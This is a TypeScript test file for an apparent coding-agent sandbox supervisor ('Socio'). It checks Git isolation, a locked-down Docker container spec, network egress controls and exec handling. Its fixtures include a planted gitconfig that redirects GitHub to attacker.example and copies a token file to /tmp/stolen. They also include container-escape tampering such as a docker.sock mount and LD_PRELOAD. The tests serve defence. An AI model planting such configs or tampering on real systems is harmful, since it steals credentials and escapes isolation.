            mkdirSync(join(repo, '.git', 'info'), { recursive: true });
            writeFileSync(join(repo, '.git', 'info', 'attributes'), '* -diff\n');
            // Without the fix's flags, Git hides the change.
            expect(git('diff', 'refs/remotes/origin/main...HEAD')).toMatch(/Binary files/);
            const plan = execPlan('diff', { base: 'main' }, config());
            if (!plan.ok) {
                throw new Error(plan.reason);
            }
            // The plan's argv, minus `timeout`, run on this repository.
            const argv = plan.value.argv.slice(4);
            argv[argv.indexOf('/work/repo')] = repo;
            const out = execFileSync(argv[0], argv.slice(1), {
                env: { ...env, GIT_LITERAL_PATHSPECS: '1' },
            }).toString('utf8');
            expect(out).not.toMatch(/Binary files/);
            expect(out).toContain('+exfiltrated-looking change');
        } finally {
            rmSync(dir, { recursive: true, force: true });
        }
    });

    it('never reads the agent-writable global config, but keeps the managed system one', () => {
        const dir = mkdtempSync(join(tmpdir(), 'socio-global-'));
        try {
            const repo = join(dir, 'repo');
            const home = join(dir, 'home');
            mkdirSync(join(home, '.config', 'git'), { recursive: true });
            // What the agent could plant in HOME=/tmp/home between Socio's commands.
            const planted = [
                '[diff]',
                '\tnoprefix = true',
                '[url "http://attacker.example/"]',
                '\tinsteadOf = https://github.com/',
                '[credential]',
                '\thelper = !cat /run/socio/token > /tmp/stolen',
                '',
            ].join('\n');
            writeFileSync(join(home, '.gitconfig'), planted);
            writeFileSync(join(home, '.config', 'git', 'config'), planted);
            const base = {
                PATH: process.env.PATH,
                HOME: home,
                XDG_CONFIG_HOME: join(home, '.config'),
                // The image's root-owned /etc/gitconfig.
                GIT_CONFIG_SYSTEM: join(import.meta.dirname, '..', 'deployment', 'coding', 'gitconfig'),
                GIT_AUTHOR_NAME: IDENTITY.name,
                GIT_AUTHOR_EMAIL: IDENTITY.email,
                GIT_COMMITTER_NAME: IDENTITY.name,
                GIT_COMMITTER_EMAIL: IDENTITY.email,
            };
            const run = (env: Record<string, string | undefined>, args: string[]) =>
                execFileSync('git', args, { env, cwd: dir }).toString('utf8');
            mkdirSync(repo);
            run(base, ['-C', repo, 'init', '-q', '-b', 'main']);
            writeFileSync(join(repo, 'a.txt'), 'before\n');
            run(base, ['-C', repo, 'add', 'a.txt']);
            run(base, ['-C', repo, 'commit', '-q', '-m', 'base']);
            run(base, ['-C', repo, 'update-ref', 'refs/remotes/origin/main', 'HEAD']);
            writeFileSync(join(repo, 'a.txt'), 'after\n');
            run(base, ['-C', repo, 'commit', '-q', '-am', 'change']);
            // Without the plan's environment the planted config applies.
            expect(run(base, ['-C', repo, 'diff', 'refs/remotes/origin/main...HEAD'])).toContain(
                'diff --git a.txt a.txt',
            );
            const limits = config();
            const setup = execPlan(
                'setup',
                {
                    repository: 'acme/widgets',
                    base: 'main',
                    branch: 'socio/rulo/a1b2',
                    identity: IDENTITY,
                },
                limits,
            );
            for (const [kind, params] of [
                ['status', {}],
                ['diff', { base: 'main' }],
                ['changes', { base: 'main' }],
            ] as const) {
                const plan = execPlan(kind, params, limits);
                if (!plan.ok) {
                    throw new Error(plan.reason);
                }
                expect(plan.value.env, kind).toContain('GIT_CONFIG_GLOBAL=/dev/null');
                expect(plan.value.env, kind).not.toContain('GIT_CONFIG_NOSYSTEM=1');
                const argv = plan.value.argv.slice(4);
                argv[argv.indexOf('/work/repo')] = repo;
                const env = {
                    ...base,
                    ...Object.fromEntries(plan.value.env.map((entry) => entry.split(/=(.*)/s).slice(0, 2))),
                };
                const out = run(env, argv.slice(1));
                if (kind === 'diff') {
                    expect(out).toContain('diff --git a/a.txt b/a.txt');
                }
                // The managed system config still sends GitHub to the gateway with
                // Socio's credential helper; the planted ones are never seen.
                const config = run(env, ['config', '--show-origin', '--list']);
                expect(config).toContain('url.http://gateway.socio.internal/git/.insteadof=https://github.com/');
                expect(config).toContain(
                    'credential.http://gateway.socio.internal.helper=/usr/local/lib/socio/git-credential-socio',
                );
                expect(config).not.toContain('attacker.example');
                expect(config).not.toContain('/tmp/stolen');
            }
            if (!setup.ok) {
                throw new Error(setup.reason);
            }
            expect(setup.value.env).toContain('GIT_CONFIG_GLOBAL=/dev/null');
            expect(setup.value.env).toContain(`GIT_AUTHOR_NAME=${IDENTITY.name}`);
            // OpenCode's own prompt keeps its environment (only Socio's Git is pinned).
            const prompt = execPlan('prompt', promptParams(), limits);
            expect(prompt.ok && prompt.value.env).not.toContain('GIT_CONFIG_GLOBAL=/dev/null');
        } finally {
            rmSync(dir, { recursive: true, force: true });
        }
    });

    it('ignores any attributes file in Socio’s Git commands, and setup drops .git/info', () => {
        const limits = config();
        for (const kind of ['status', 'diff', 'changes'] as const) {
            const plan = execPlan(kind, kind === 'status' ? {} : { base: 'main' }, limits);
            if (!plan.ok) {
                throw new Error(plan.reason);
            }
            expect(plan.value.argv.join(' '), kind).toContain('-c core.attributesFile=/dev/null');
        }
        const diff = execPlan('diff', { base: 'main' }, limits);
        expect(diff.ok && diff.value.argv).toContain('--text');
    });
});

describe('the fixed container spec', () => {
    const limits = config({ COMPUTER_RUNTIME: 'runsc' });
    const names = sandboxNames(NS, 'sess-1', KEY);
    const spec = containerSpec(
        limits,
        names,
        { cpus: 1.5, memoryBytes: 2 * 1024 ** 3, pids: 256 },
        {
            address: '10.213.0.2',
            user: PROXY_USER,
            password: PROXY_PASSWORD,
        },
    );

    it('runs unprivileged: uid 1000, read-only root, no capabilities, no new privileges', () => {
        expect(spec.Image).toBe(IMAGE);
        expect(spec.User).toBe('1000:1000');
        expect(spec.HostConfig.ReadonlyRootfs).toBe(true);
        expect(spec.HostConfig.Privileged).toBe(false);
        expect(spec.HostConfig.CapDrop).toEqual(['ALL']);
        expect(spec.HostConfig.CapAdd).toEqual([]);
        expect(spec.HostConfig.SecurityOpt).toEqual(['no-new-privileges:true']);
        expect(spec.HostConfig.IpcMode).toBe('private');
        expect(spec.HostConfig.Init).toBe(true);
        expect(spec.HostConfig.RestartPolicy).toEqual({ Name: 'no' });
        expect(spec.HostConfig.Runtime).toBe('runsc');
        expect(spec.HostConfig.Devices).toEqual([]);
    });

    it('mounts only the workspace volume and two tmpfs, never a host path or the socket', () => {
        expect(spec.HostConfig.Binds).toEqual([]);
        expect(spec.HostConfig.Mounts).toEqual([
            {
                Type: 'volume',
                Source: `${NS}-code-work-${KEY}`,
                Target: '/work',
                ReadOnly: false,
            },
        ]);
        expect(Object.keys(spec.HostConfig.Tmpfs).sort()).toEqual(['/run/socio', '/tmp']);
        expect(spec.HostConfig.Tmpfs['/run/socio']).toMatch(/noexec.*uid=1000.*mode=0700/);
        expect(JSON.stringify(spec)).not.toMatch(/docker\.sock|"\/:|\/var\/run|\/proc/);
    });

    it('sets resource limits, no swap beyond memory, and no published ports', () => {
        expect(spec.HostConfig.NanoCpus).toBe(1_500_000_000);
        expect(spec.HostConfig.Memory).toBe(2 * 1024 ** 3);
        expect(spec.HostConfig.MemorySwap).toBe(2 * 1024 ** 3);
        expect(spec.HostConfig.PidsLimit).toBe(256);
        expect(spec.HostConfig.Ulimits).toContainEqual({
            Name: 'core',
            Soft: 0,
            Hard: 0,
        });
        expect(spec.HostConfig.PortBindings).toEqual({});
        expect(spec.HostConfig.PublishAllPorts).toBe(false);
        expect(spec.ExposedPorts).toEqual({});
    });

    it('joins only its own network, with no resolver and the proxy named by address', () => {
        expect(spec.HostConfig.NetworkMode).toBe(`${NS}-code-sess-1`);
        expect(spec.HostConfig.Dns).toEqual(['127.0.0.1']);
        expect(spec.HostConfig.DnsSearch).toEqual([]);
        expect(spec.HostConfig.ExtraHosts).toEqual([]);
        const proxy = `http://${PROXY_USER}:${PROXY_PASSWORD}@10.213.0.2:3128`;
        for (const name of ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']) {
            expect(spec.Env).toContain(`${name}=${proxy}`);
        }
        expect(spec.Env).toContain('NO_PROXY=');
        expect(spec.Env).toContain('no_proxy=');
        expect(spec.Env).toContain('SOCIO_GATEWAY_TOKEN_FILE=/run/socio/token');
        expect(spec.Env).toContain('npm_config_registry=http://npm.registry.socio.internal/');
        expect(spec.Entrypoint).toEqual(['sleep']);
        expect(spec.Cmd).toEqual(['infinity']);
    });

    it('creates an internal, IPv4-only /28 network with no host address', () => {
        const network = networkSpec(limits, names, '10.213.0.16/28', {
            cpus: 1,
            memoryBytes: 1,
            pids: 64,
        });
        expect(network).toMatchObject({
            Name: `${NS}-code-sess-1`,
            Driver: 'bridge',
            Internal: true,
            EnableIPv6: false,
            Attachable: false,
            IPAM: { Config: [{ Subnet: '10.213.0.16/28' }] },
        });
        expect(network.Options['com.docker.network.bridge.inhibit_ipv4']).toBe('true');
        expect(network.Options['com.docker.network.bridge.enable_ip_masquerade']).toBe('false');
        expect(allocateSubnet(limits.pool!, new Set(['10.213.0.0/28']))).toBe('10.213.0.16/28');
        expect(
            allocateSubnet({ base: 0x0ad50000, bits: 27 }, new Set(['10.213.0.0/28', '10.213.0.16/28'])),
        ).toBeUndefined();
    });

    it('reports every field an inspected container got wrong', () => {
        const inspected = () => ({
            Image: IMAGE_ID,
            Config: {
                Image: spec.Image,
                User: spec.User,
                Entrypoint: spec.Entrypoint,
                Cmd: spec.Cmd,
                // Docker merges the image's environment in, the spec's winning.
                Env: ['PATH=/usr/local/bin:/usr/bin:/bin', ...spec.Env],
                Labels: spec.Labels,
                ExposedPorts: null,
            },
            HostConfig: {
                ...structuredClone(spec.HostConfig),
                CapAdd: null,
                DeviceRequests: null,
                Sysctls: null,
                OomKillDisable: false,
                CgroupParent: '',
                MaskedPaths: [...DOCKER_MASKED_PATHS],
                ReadonlyPaths: [...DOCKER_READONLY_PATHS],
            },
            Mounts: [{ Type: 'volume', Name: names.volume, Destination: '/work' }],
            NetworkSettings: { Networks: { [names.network]: {} } },
        });
        const imageEnv = ['PATH=/usr/local/bin:/usr/bin:/bin', 'HOME=/home/node'];
        expect(specMismatches(inspected(), spec, IMAGE_ID, imageEnv)).toEqual([]);
        const cases: Array<[string, (info: DockerJson) => void]> = [
            ['HostConfig.Privileged', (info) => (info.HostConfig.Privileged = true)],
            ['HostConfig.CapAdd', (info) => (info.HostConfig.CapAdd = ['NET_ADMIN'])],
            ['HostConfig.CapDrop', (info) => (info.HostConfig.CapDrop = [])],
            ['HostConfig.ReadonlyRootfs', (info) => (info.HostConfig.ReadonlyRootfs = false)],
            [
                'HostConfig.SecurityOpt',
                (info) => (info.HostConfig.SecurityOpt = ['seccomp=unconfined', 'no-new-privileges']),
            ],
            ['HostConfig.Binds', (info) => (info.HostConfig.Binds = ['/var/run/docker.sock:/var/run/docker.sock'])],
            ['Mounts', (info) => info.Mounts.push({ Type: 'bind', Source: '/', Destination: '/host' })],
            ['HostConfig.NetworkMode', (info) => (info.HostConfig.NetworkMode = 'host')],
            ['NetworkSettings.Networks', (info) => (info.NetworkSettings.Networks.bridge = {})],
            ['HostConfig.PidMode', (info) => (info.HostConfig.PidMode = 'host')],
            ['HostConfig.UsernsMode', (info) => (info.HostConfig.UsernsMode = 'host')],
            [
                'HostConfig.PortBindings',
                (info) => (info.HostConfig.PortBindings = { '22/tcp': [{ HostPort: '2222' }] }),
            ],
            ['HostConfig.Dns', (info) => (info.HostConfig.Dns = ['8.8.8.8'])],
            ['HostConfig.Devices', (info) => (info.HostConfig.Devices = [{ PathOnHost: '/dev/kvm' }])],
            ['Config.User', (info) => (info.Config.User = 'root')],
            ['Config.Image', (info) => (info.Config.Image = 'alpine')],
            ['Image', (info) => (info.Image = 'sha256:other')],
            ['HostConfig.Memory', (info) => (info.HostConfig.Memory = 0)],
            ['HostConfig.PidsLimit', (info) => (info.HostConfig.PidsLimit = -1)],
            ['HostConfig.Runtime', (info) => (info.HostConfig.Runtime = 'runc')],
            ['Config.Cmd', (info) => (info.Config.Cmd = ['sh'])],
            // Also checked: the environment, sysctls, masked and read-only
            // paths, tmpfs options, the OOM killer and the cgroup parent.
            ['Config.Env', (info) => info.Config.Env.push('LD_PRELOAD=/tmp/x.so')],
            [
                'Config.Env',
                (info) =>
                    (info.Config.Env = info.Config.Env.map((entry: string) =>
                        entry.startsWith('HTTP_PROXY=') ? 'HTTP_PROXY=http://203.0.113.9:3128' : entry,
                    )),
            ],
            [
                'Config.Env',
                (info) => (info.Config.Env = info.Config.Env.filter((entry: string) => !entry.startsWith('NO_PROXY='))),
            ],
            ['Config.Env', (info) => info.Config.Env.push('NO_PROXY=*')],
            ['HostConfig.Sysctls', (info) => (info.HostConfig.Sysctls = { 'net.ipv4.ip_forward': '1' })],
            ['HostConfig.MaskedPaths', (info) => (info.HostConfig.MaskedPaths = [])],
            [
                'HostConfig.MaskedPaths',
                (info) => (info.HostConfig.MaskedPaths = DOCKER_MASKED_PATHS.filter((path) => path !== '/proc/kcore')),
            ],
            ['HostConfig.ReadonlyPaths', (info) => (info.HostConfig.ReadonlyPaths = null)],
            ['HostConfig.ReadonlyPaths', (info) => (info.HostConfig.ReadonlyPaths = ['/proc/bus'])],
            ['HostConfig.Tmpfs', (info) => (info.HostConfig.Tmpfs['/tmp'] = 'rw,exec,size=1g')],
            ['HostConfig.Tmpfs', (info) => (info.HostConfig.Tmpfs['/run/socio'] = 'rw,uid=1000,mode=0777')],
            ['HostConfig.OomKillDisable', (info) => (info.HostConfig.OomKillDisable = true)],
            ['HostConfig.CgroupParent', (info) => (info.HostConfig.CgroupParent = '/')],
        ];
        for (const [field, change] of cases) {
            const info = inspected();
            change(info);
            expect(specMismatches(info, spec, IMAGE_ID, imageEnv), field).toContain(field);
        }
        // An image variable the spec doesn't set passes; one it sets, the spec wins.
        const fromImage = inspected();
        fromImage.Config.Env.push('HOME=/home/node');
        expect(specMismatches(fromImage, spec, IMAGE_ID, imageEnv)).toContain('Config.Env');
        expect(specMismatches(inspected(), spec, IMAGE_ID, [])).toContain('Config.Env');
        // Tmpfs options compare whatever the key order.
        const reordered = inspected();
        reordered.HostConfig.Tmpfs = Object.fromEntries(Object.entries(spec.HostConfig.Tmpfs).reverse());
        expect(specMismatches(reordered, spec, IMAGE_ID, imageEnv)).toEqual([]);
    });
});

describe('the sandbox lifecycle against a fake Docker', () => {
    it('creates nothing until the egress self-test passes', async () => {
        for (const [stdout, exitCode, failure] of [
            [
                '{"probe":"socio-egress-probe","v":1,"resolved":["example.com"],"reached":[],"tunnel":false}',
                0,
                'resolved example.com',
            ],
            [
                '{"probe":"socio-egress-probe","v":1,"resolved":[],"reached":["1.1.1.1:443","gateway:4300"],"tunnel":false}',
                0,
                'reached gateway:4300',
            ],
            [
                '{"probe":"socio-egress-probe","v":1,"resolved":[],"reached":[],"tunnel":true}',
                0,
                'the proxy opened a tunnel',
            ],
            ['', 0, 'the egress probe did not report'],
            [
                '{"probe":"socio-egress-probe","v":1,"resolved":[],"reached":[],"tunnel":false}',
                1,
                'the egress probe did not report',
            ],
        ] as const) {
            const { docker, api, logs } = await ready();
            docker.probe = { stdout, exitCode };
            const answer = await api.handle('POST', '/sandboxes', {
                sessionId: 'sess-1',
                volumeKey: KEY,
            });
            expect(answer.status).toBe(503);
            expect(answer.body.failures).toContain(failure);
            expect(docker.calls).not.toContain(`createNetwork ${NS}-code-sess-1`);
            // The canary is gone, whatever happened.
            expect(docker.containers.size + docker.networks.size + docker.volumes.size).toBe(0);
            expect(logs.at(-1)).toMatch(/self-test FAILED/);
        }
    });

    it('runs from a local image ID, the pin of an image built here and never pushed, and only that image', async () => {
        const LOCAL = `sha256:${'d'.repeat(64)}`;
        expect(config({ CODING_SANDBOX_IMAGE: LOCAL })).toMatchObject({
            enabled: true,
            image: LOCAL,
        });
        // Docker resolves the ID locally: the image found is that one.
        const { docker, api } = await ready({ CODING_SANDBOX_IMAGE: LOCAL });
        docker.images.set(LOCAL, { Id: LOCAL });
        expect((await api.runSelfTest()).ok).toBe(true);
        // An engine that answers another image for that reference: refused.
        const other = await ready({ CODING_SANDBOX_IMAGE: LOCAL });
        other.docker.images.set(LOCAL, { Id: `sha256:${'e'.repeat(64)}` });
        const state = await other.api.runSelfTest();
        expect(state.ok).toBe(false);
        expect(state.failures[0]).toMatch(/image is not on this host/);
    });

    it('fails the self-test closed without the egress proxy or the image', async () => {
        const { docker, api } = await ready();
        docker.egress = undefined;
        const state = await api.runSelfTest();
        expect(state.ok).toBe(false);
        expect(state.failures[0]).toMatch(/egress proxy is not running/);
        const other = await ready();
        other.docker.images.clear();
        expect((await other.api.runSelfTest()).failures[0]).toMatch(/image is not on this host/);
    });

    it('runs the canary with the same fixed spec and cleans it up', async () => {
        const { docker, api } = await ready();
        const state = await api.runSelfTest();
        expect(state).toMatchObject({
            ok: true,
            mode: 'virtual-hosts',
            failures: [],
        });
        expect(docker.calls).toContain(`createContainer ${NS}-code-selftest`);
        expect(docker.calls).toContain(`removeContainer ${NS}-code-selftest`);
        expect(docker.calls).toContain(`removeNetwork ${NS}-code-selftest`);
        expect(docker.containers.size + docker.networks.size + docker.volumes.size).toBe(0);
        // A canary that differs from the fixed spec fails the self-test too.
        const tampered = await ready();
        tampered.docker.tamper = (info) => (info.HostConfig.CapAdd = ['NET_RAW']);
        const failed = await tampered.api.runSelfTest();
        expect(failed.ok).toBe(false);
        expect(failed.failures[0]).toMatch(/fixed spec/);
    });

    it('creates the network, connects the proxy, then starts the inspected container', async () => {
        const { docker, api, answer } = await created();
        expect(answer.body).toEqual({
            sessionId: 'sess-1',
            state: 'network-ready',
            subnet: '10.213.0.0/28',
            proxyAddress: '10.213.0.2:3128',
        });
        expect(docker.calls).toContain(`connect ${NS}-code-sess-1 egress-container-id`);
        expect(docker.volumes.get(`${NS}-code-work-${KEY}`)?.Labels[LABELS.volume]).toBe(KEY);
        // Retrying the create is answered from the existing network.
        const again = await api.handle('POST', '/sandboxes', {
            sessionId: 'sess-1',
            volumeKey: KEY,
        });
        expect(again.status).toBe(200);
        expect(again.body.proxyAddress).toBe('10.213.0.2:3128');
        // Another workspace for the same session is a conflict.
        const other = await api.handle('POST', '/sandboxes', {
            sessionId: 'sess-1',
            volumeKey: 'c'.repeat(64),
        });
        expect(other.status).toBe(409);
        const start = await api.handle('POST', '/sandboxes/sess-1/start', {
            proxyUser: PROXY_USER,
            proxyPassword: PROXY_PASSWORD,
        });
        expect(start.status).toBe(200);
        const container = docker.containers.get(`${NS}-code-sess-1`);
        expect(container.info.State.Running).toBe(true);
        expect(container.spec.Env).toContain(`HTTP_PROXY=http://${PROXY_USER}:${PROXY_PASSWORD}@10.213.0.2:3128`);
        expect(container.spec.HostConfig.NanoCpus).toBe(2e9);
        expect(
            (
                await api.handle('POST', '/sandboxes/sess-1/start', {
                    proxyUser: PROXY_USER,
                    proxyPassword: PROXY_PASSWORD,
                })
            ).status,
        ).toBe(409);
        const listed = await api.handle('GET', '/sandboxes');
        expect(listed.body.sandboxes).toEqual([expect.objectContaining({ sessionId: 'sess-1', state: 'running' })]);
    });

    it('removes a container whose inspected spec differs, and reports the fields', async () => {
        const { docker, api } = await created();
        docker.tamper = (info) => {
            info.HostConfig.Privileged = true;
            info.HostConfig.Binds = ['/var/run/docker.sock:/var/run/docker.sock'];
        };
        const answer = await api.handle('POST', '/sandboxes/sess-1/start', {
            proxyUser: PROXY_USER,
            proxyPassword: PROXY_PASSWORD,
        });
        expect(answer.status).toBe(500);
        expect(answer.body.fields).toEqual(['HostConfig.Privileged', 'HostConfig.Binds']);
        expect(docker.containers.has(`${NS}-code-sess-1`)).toBe(false);
        expect(docker.calls).not.toContain(`start ${NS}-code-sess-1`);
    });

    it('gives each session its own subnet, skips a taken range and keeps to the ceiling', async () => {
        const { docker, api } = await created({ CODING_SANDBOX_MAX: '2' });
        // Something outside this supervisor holds the next range.
        docker.networks.set('foreign', {
            Name: 'foreign',
            IPAM: { Config: [{ Subnet: '10.213.0.16/28' }] },
            Labels: {},
            Containers: {},
        });
        const second = await api.handle('POST', '/sandboxes', {
            sessionId: 'sess-2',
            volumeKey: 'c'.repeat(64),
        });
        expect(second.status).toBe(201);
        expect(second.body.subnet).toBe('10.213.0.32/28');
        const third = await api.handle('POST', '/sandboxes', {
            sessionId: 'sess-3',
            volumeKey: 'd'.repeat(64),
        });
        expect(third.status).toBe(429);
    });

    it('keeps to the ceiling when creates race (CODING_SANDBOX_MAX)', async () => {
        const { docker, api } = await ready({ CODING_SANDBOX_MAX: '2' });
        await api.runSelfTest();
        const answers = await Promise.all(
            ['sess-1', 'sess-2', 'sess-3', 'sess-4'].map((sessionId, index) =>
                api.handle('POST', '/sandboxes', {
                    sessionId,
                    volumeKey: String(index + 1).repeat(64),
                }),
            ),
        );
        expect(answers.map((answer) => answer.status).sort()).toEqual([201, 201, 429, 429]);
        expect(docker.networks.size).toBe(2);
    });

    it('refuses to delete a workspace a network-ready sandbox will mount', async () => {
        const { docker, api } = await created();
        const volume = `${NS}-code-work-${KEY}`;
        expect((await api.handle('DELETE', `/workspaces/${KEY}`)).status).toBe(409);
        expect(docker.volumes.has(volume)).toBe(true);
        // Removed behind the supervisor's back: start makes it again, labeled,
        // instead of letting Docker create an unlabeled one that would answer
        // 409 for this workspace forever.
        docker.volumes.delete(volume);
        const start = await api.handle('POST', '/sandboxes/sess-1/start', {
            proxyUser: PROXY_USER,
            proxyPassword: PROXY_PASSWORD,
        });
        expect(start.status).toBe(200);
        expect(docker.volumes.get(volume)?.Labels).toMatchObject({
            [LABELS.owner]: 'true',
            [LABELS.namespace]: NS,
            [LABELS.volume]: KEY,
        });
        expect(docker.calls.indexOf(`createVolume ${volume}`)).toBeLessThan(
            docker.calls.lastIndexOf(`createContainer ${NS}-code-sess-1`),
        );
        expect((await api.handle('DELETE', '/sandboxes/sess-1')).status).toBe(200);
        expect(await api.handle('DELETE', `/workspaces/${KEY}`)).toEqual({
            status: 200,
            body: { removed: true },
        });
    });

    it('never adopts or removes a container or network it does not own', async () => {
        const { docker, api } = await ready();
        docker.networks.set(`${NS}-code-sess-1`, {
            Name: `${NS}-code-sess-1`,
            IPAM: { Config: [{ Subnet: '172.30.0.0/28' }] },
            Labels: {},
            Containers: {},
        });
        expect(
            (
                await api.handle('POST', '/sandboxes', {
                    sessionId: 'sess-1',
                    volumeKey: KEY,
                })
            ).status,
        ).toBe(409);
        expect((await api.handle('DELETE', '/sandboxes/sess-1')).status).toBe(409);
        expect(docker.networks.has(`${NS}-code-sess-1`)).toBe(true);
        docker.volumes.set(`${NS}-code-work-${KEY}`, { Labels: {} });
        expect((await api.handle('DELETE', `/workspaces/${KEY}`)).status).toBe(409);
        expect(docker.volumes.has(`${NS}-code-work-${KEY}`)).toBe(true);
    });

    it('lists a container whose network is gone, so it can be reaped', async () => {
        const { docker, api } = await started();
        docker.networks.delete(`${NS}-code-sess-1`);
        const listed = await api.handle('GET', '/sandboxes');
        expect(listed.body.sandboxes).toEqual([
            expect.objectContaining({
                sessionId: 'sess-1',
                state: 'running',
                networkMissing: true,
            }),
        ]);
        // The reaper's delete removes it, and frees the workspace.
        expect(await api.handle('DELETE', '/sandboxes/sess-1')).toEqual({
            status: 200,
            body: { removed: true },
        });
        expect(docker.containers.size).toBe(0);
        expect((await api.handle('GET', '/sandboxes')).body.sandboxes).toEqual([]);
        expect((await api.handle('DELETE', `/workspaces/${KEY}`)).status).toBe(200);
    });

    it('refuses to create a sandbox when the egress proxy is missing', async () => {
        const { docker, api } = await ready();
        await api.runSelfTest();
        docker.egress = undefined;
        const answer = await api.handle('POST', '/sandboxes', {
            sessionId: 'sess-1',
            volumeKey: KEY,
        });
        expect(answer.status).toBe(503);
        expect(docker.networks.size).toBe(0);
    });

    it('deletes the container and network but keeps the workspace until asked', async () => {
        const { docker, api } = await started();
        expect((await api.handle('DELETE', `/workspaces/${KEY}`)).status).toBe(409);
        expect(await api.handle('DELETE', '/sandboxes/sess-1')).toEqual({
            status: 200,
            body: { removed: true },
        });
        expect(docker.calls).toContain(`disconnect ${NS}-code-sess-1 egress-container-id`);
        expect(docker.containers.size).toBe(0);
        expect(docker.networks.size).toBe(0);
        expect(docker.volumes.has(`${NS}-code-work-${KEY}`)).toBe(true);
        expect(await api.handle('DELETE', '/sandboxes/sess-1')).toEqual({
            status: 200,
            body: { removed: false },
        });
        expect(await api.handle('DELETE', `/workspaces/${KEY}`)).toEqual({
            status: 200,
            body: { removed: true },
        });
        expect(docker.volumes.size).toBe(0);
        expect((await api.handle('DELETE', '/workspaces/not-a-key')).status).toBe(400);
    });
});

describe('detached execs', () => {
    it('runs a prompt as uid 1000 with the prompt on stdin, keyed by run id', async () => {
        const { docker, api } = await started();
        let finish: (result: ExecResult) => void = () => {};
        docker.onExec = () => new Promise((resolve) => (finish = resolve));
        const first = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'run-1',
            kind: 'prompt',
            params: promptParams(),
        });
        expect(first.status).toBe(202);
        expect(first.body).toMatchObject({
            runId: 'run-1',
            kind: 'prompt',
            state: 'running',
        });
        await expect.poll(() => docker.execs.length).toBe(1);
        const [{ options, stdin }] = docker.execs;
        expect(options.User).toBe('1000:1000');
        expect(options.Privileged).toBe(false);
        expect(options.WorkingDir).toBe('/work/repo');
        expect(stdin).toBe('Rename the helper and run the tests.');
        expect(JSON.stringify(options)).not.toContain('Rename the helper');
        // A retry re-attaches; a second prompt waits its turn.
        const retry = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'run-1',
            kind: 'prompt',
            params: promptParams(),
        });
        expect(retry.body.state).toBe('running');
        expect(
            (
                await api.handle('POST', '/sandboxes/sess-1/exec', {
                    runId: 'run-2',
                    kind: 'prompt',
                    params: promptParams(),
                })
            ).status,
        ).toBe(409);
        expect((await api.handle('DELETE', '/sandboxes/sess-1/exec/run-1')).status).toBe(409);
        finish({
            stdout: '{"type":"text","text":"done"}\n',
            stderr: 'warn',
            exitCode: 0,
        });
        // Another runtime collects it by run id after a deploy.
        const collected = await api.handle(
            'GET',
            '/sandboxes/sess-1/exec/run-1',
            undefined,
            new URLSearchParams('wait=5'),
        );
        expect(collected.body).toMatchObject({
            state: 'exited',
            exitCode: 0,
            stdout: '{"type":"text","text":"done"}\n',
            stderr: 'warn',
            truncated: { stdout: false, stderr: false },
        });
        expect(docker.execs).toHaveLength(1);
        expect((await api.handle('GET', '/sandboxes/sess-2/exec/run-1')).status).toBe(404);
        expect(await api.handle('DELETE', '/sandboxes/sess-1/exec/run-1')).toEqual({
            status: 200,
            body: { forgotten: true },
        });
        expect((await api.handle('GET', '/sandboxes/sess-1/exec/run-1')).status).toBe(404);
    });

    it('keeps only the tail of large output and marks timeouts', async () => {
        const { docker, api } = await started();
        docker.onExec = (options) =>
            options.Cmd.includes('status')
                ? { stdout: 'x'.repeat(300 * 1024) + 'END', exitCode: 0 }
                : { exitCode: 124 };
        const status = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'r-status',
            kind: 'status',
            wait: 5,
        });
        expect(status.status).toBe(200);
        expect(status.body.truncated.stdout).toBe(true);
        expect(status.body.stdout.length).toBe(256 * 1024);
        expect(status.body.stdout.endsWith('END')).toBe(true);
        const slow = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'r-slow',
            kind: 'changes',
            params: { base: 'main' },
            wait: 5,
        });
        expect(slow.body.state).toBe('timed-out');
    });

    it('ends a run as failed when Docker refuses the exec', async () => {
        const { docker, api } = await started();
        docker.failExec = true;
        const answer = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'run-x',
            kind: 'status',
        });
        expect(answer.status).toBe(503);
        const run = await api.handle('GET', '/sandboxes/sess-1/exec/run-x');
        expect(run.body.state).toBe('failed');
        // The failed run doesn't hold the sandbox's prompt slot.
        docker.failExec = false;
        const prompt = await api.handle('POST', '/sandboxes/sess-1/exec', {
            runId: 'run-y',
            kind: 'prompt',
            params: promptParams(),
            wait: 5,
        });
        expect(prompt.body.state).toBe('exited');
    });

    it('refuses execs in a sandbox that is not running or not a session’s', async () => {
        const { api, docker } = await created();
        const body = { runId: 'run-1', kind: 'status' };
        expect((await api.handle('POST', '/sandboxes/sess-1/exec', body)).status).toBe(404);
        expect((await api.handle('POST', '/sandboxes/sess-9/exec', body)).status).toBe(404);
        expect((await api.handle('POST', '/sandboxes/selftest/exec', body)).status).toBe(400);
        expect(
            (
                await api.handle('POST', '/sandboxes/sess-1/exec', {
                    ...body,
                    runId: '../x',
                })
            ).status,
        ).toBe(400);
        expect(
            (
                await api.handle('POST', '/sandboxes/sess-1/exec', {
                    ...body,
                    cmd: ['id'],
                })
            ).status,
        ).toBe(400);
        expect(docker.execs).toHaveLength(0);
    });
});

describe('the supervisor wiring', () => {
    it('mounts the routes on Hono, reads JSON bodies and bounds their size', async () => {
        const app = new Hono();
        const docker = new FakeDocker();
        const api = mountCodingSandboxes(app, {
            docker,
            env: env(),
            namespace: NS,
            log: () => {},
        });
        await api.runSelfTest();
        const post = (path: string, body: string) =>
            app.request(path, {
                method: 'POST',
                body,
                headers: { 'content-type': 'application/json' },
            });
        expect((await post('/sandboxes', '{not json')).status).toBe(400);
        expect(
            (
                await post(
                    '/sandboxes',
                    JSON.stringify({
                        sessionId: 'x',
                        volumeKey: KEY,
                        pad: 'p'.repeat(600 * 1024),
                    }),
                )
            ).status,
        ).toBe(413);
        const created = await post('/sandboxes', JSON.stringify({ sessionId: 'sess-1', volumeKey: KEY }));
        expect(created.status).toBe(201);
        expect((await app.request('/sandboxes/self-test')).status).toBe(200);
        expect((await app.request('/sandboxes/sess-1/exec/none?wait=1')).status).toBe(404);
    });

    it('patches the pinned supervisor in exactly two places, after its token check', () => {
        const upstream = [
            'import { listenPort } from "./listen-port";',
            'app.use("*", async (context, next) => { /* token check */ });',
            'serve({ port, fetch: app.fetch, idleTimeout: 120 });',
        ].join('\n');
        const patched = hardenSupervisorSandboxes(upstream);
